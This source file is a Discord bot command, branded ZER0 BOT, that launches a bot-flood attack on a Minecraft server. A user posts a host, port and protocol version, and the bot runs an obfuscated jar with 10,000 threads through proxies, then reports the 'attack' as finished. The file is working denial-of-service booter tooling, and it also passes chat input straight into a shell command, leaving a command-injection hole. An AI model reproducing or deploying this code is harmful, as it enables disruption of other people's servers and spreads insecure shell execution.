const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Formato ;antibot 1.1.1.1 25565 47`")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Se requiere especificar el Puerto`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('⚠️ ADVERTENCIA')
	.setDescription("`Se requiere especificar la versión`")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=proxies.txt threads=10000 method=nantibot version=${protocol} license=123ascqweq11`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Ataque detenido ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**► ¡Ataque finalizado 💥**")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Iniciando ataque ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **ZER0 BOT** 🔥')
	.setTimestamp()
	.setDescription("**Usuario**: `" + message.author.username + "` \n **Servidor**: `" + host + "` \n **Puerto**: `" + port + "` \n **Versión**: `" + protocol + "`\n \n **Método**: `nAntiBot 💥` \n **Cantidad de Bots**: `25.000 🚀` \n **Tiempo**: `60 segundos 🕒`")
	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['antibot'],
  permLevel: 0
}

exports.help = {
  name: 'antibot',
  description: 'Özel',
  usage: 'antibot'
}